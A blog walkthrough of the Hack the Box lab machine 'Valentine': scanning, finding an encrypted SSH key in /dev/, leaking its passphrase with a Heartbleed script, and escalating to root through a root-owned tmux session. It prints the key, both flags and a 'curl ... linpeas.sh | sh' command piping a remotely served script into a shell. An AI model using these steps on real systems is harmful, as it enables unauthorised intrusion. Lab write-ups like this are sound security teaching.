+++
title = "HTB - Valentine"
date = 2025-03-04
+++

---
title: "Valentine - Hack the Box"
date: 2024-9-11 10:59:20 -0400
categories: [Hack the Box]
tags: [Walkthrough, Linux, Heartbleed, CVE, Easy]
image: /assets/Valentine.png
---
<img alt="Image" async src="images/Valentine.png" width="800px"></img>

Valentine is an easy machine that starts with finding a hidden `/dev/` directory that houses some important information. We can leverage access to decrypt an encoded SSH key, and use complimenting vulnerability scans to identify a CVE, and exploit it for an encoded string that we can decode with resources from `/dev/`. Putting together the SSH key and password for access, we get on the box and can use `LinPEAS` to identify a `tmux` session running as root, and tap in for root access. Let's get cracking.

### Scan
```
└─# nmap -sV -sC --open -p- 10.10.10.79 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 10:59 EDT
Nmap scan report for 10.10.10.79
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2024-09-11T15:00:45+00:00; 0s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.90 seconds
```

From our scan, we can see openings on ports `22, 80, 443`.  This looks like we'll be enumerating from the web vector to see what else we can find. We can also update our `/etc/hosts` file with the domain name `valentine.htb`

### Enumeration

<img alt="Image" async src="images/Screenshot 2024-09-11 at 11.05.09 AM.png" width="800px"></img>

Entering the website, we get a pretty big hint with the landing page above - it takes a very trained eye. Heartbleed is an early OpenSSL vulnerability that hemorrhages sensitive information through incorrect memory handling of the heartbeat expansion. We can abuse this to leak information like keys, credentials, and server system information. There's official documentation [here](https://nvd.nist.gov/vuln/detail/CVE-2014-0160), but going organically into this box, I hadn't known what this was.

Using `feroxbuster`, we can try to uncover some directories from the server. I also had `ffuf` in another window hunting subdomains. 

`feroxbuster -u http://10.10.10.79 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -n`
`wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://valentine.htb -H "HOST:FUZZ.valentine.htb" --hc 404 --hh 1131`

<img alt="Image" async src="images/Screenshot 2025-02-23 at 10.41.41.png" width="800px"></img>

We've got a lot of interesting finds here. As I've talked about before, the `/dev/` directory is almost always home to some valuable information.

<img alt="Image" async src="images/Screenshot 2025-02-23 at 10.47.21.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2025-02-23 at 10.48.22.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2025-02-23 at 10.50.14.png" width="800px"></img>

Here, we can extract a todo list from a developer, and a hex-coded key for a user named `hype`. We can also see and `encode.php` and `decode.php` function that was mentioned in the todo list and our `feroxbuster` scans.  Initially, the thought is to use this for the key, but testing out the tool, we find that it's a base 64 encoder/decoder. Our key is hex, so we'll need to use another option. When we do decode the message, we get a Private RSA key, and I assume by the title of the file, it belongs to the user `hype`. As a disclaimer, though, be wary of decrypting sensitive files and such online, as you don't know who or what is logging them in the backend. Take the key and save it to a file `rsaprivate.txt`.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

We can take this key to try and SSH into `hype@10.10.10.79`, but we'll be met with an error. The reason being is permissions. We cannot use a behaviorally "loose" file when transferring private keys, as that'd be insecure and against the whole ethos of secure shell. To change the perms to read only, we can use `chmod 600 [File]` and then try again.  `ssh -i hype.key hype@10.10.10.79`

We're allowed an attempt to connect, but we still need a password that we don't have. We're missing something. Further enumeration is required. 

### Initial Access

We can throw things at the wall and see what sticks, so I'll use an `nmap` script for potential vulnerabilities and see what comes back.

`nmap --script vuln 10.10.10.79`

<img alt="Image" async src="images/Screenshot 2025-02-23 at 10.56.35.png" width="800px"></img>

There's our HeartBleed. We can probably find a Github repository for this exact purpose and clone it onto our machine. It's important to be a bit more thorough and intense when validating the `nmap` results. Doing some combing on google, I find that the OpenSSL version around the time of this Apache release was 1.0.1, which checks out and warrants at least an attempt at exploitation. If Github isn't to our liking, we could also use `searchsploit` and alter the python script there to fit our needs: `git clone https://gist.github.com/10174134.git`

This script uses `python2`, so be weary when altering. Use the correct syntax: `python2 heartbleed.py valentine.htb -a result.txt`. The `-a` specifies an ASCII output for readability.

<img alt="Image" async src="images/Screenshot 2025-02-23 at 11.15.25.png" width="800px"></img>

We get an encoded string here. This looks like base64, and going back to the decode tool, we can confirm.

<img alt="Image" async src="images/Screenshot 2024-09-11 at 11.28.57 AM.png" width="800px"></img> 

`heartbleedbelievethehype` Now with a password, we can try to login again, and use the password as the RSA_Key password.

`ssh -i hype.key hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=ssh-rsa`

(Note, you may have errors if you forgo the -o parameter, as I believe RSA algorithms are no longer supported by default, so we have to specify that this is what we are trying to do.)

<img alt="Image" async src="images/Screenshot 2025-02-26 at 13.36.02.png" width="800px"></img>

The user flag resides in the directory that we've spawned in, and we can take it for our notes.

 `USER:9bb8c74e1764083f4e3f1cdd01cfefa6`

### Privilege Escalation

Next, we can server `LinPeas.sh` through our server, using:

 `python -m SimpleHTTPServer 8000` or `python3 -m http.server 8000`

It's important to have many ways to transfer and access files between machines. Here, I first tried to:

`wget http://10.10.14.24:8000/linpeas.sh`

I couldn't get the script to run without permissions, so I curled instead:

`curl http://10.10.14.24:8000/linpeas.sh | sh`

This ran the script as it pulled it down. Make sure to work from a directory such as `/tmp` or `/dev/shm` where there is an opportunity to make changes and edit. These will be highlighted in green in a secure shell session.

Combing through our results, a very strong opportunity for privilege escalation lies with `tmux`, as seen below.

<img alt="Image" async src="images/Screenshot 2025-02-26 at 13.36.52.png" width="800px"></img>

`tmux` is a terminal multiplexer; it allows you to create several "pseudo terminals" from a single terminal. This is very useful for running multiple programs with a single connection, such as when you're remotely connecting to a machine using SSH. There's a session running as `root`, and we can easily join the session with `tmux -S /.devs/dev_sess`

<img alt="Image" async src="images/Screenshot 2025-02-26 at 13.40.10.png" width="800px"></img>

Now we've got access to our flag for our notes.

`ROOT:a498a4ce2249b580753fabae6b30f523`

Another method of privilege escalation was through an old vulnerability called `Dirtycow`, which allows low privilege users to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system. The kernel's gotta be pretty old, though.

#easy #linux #manual 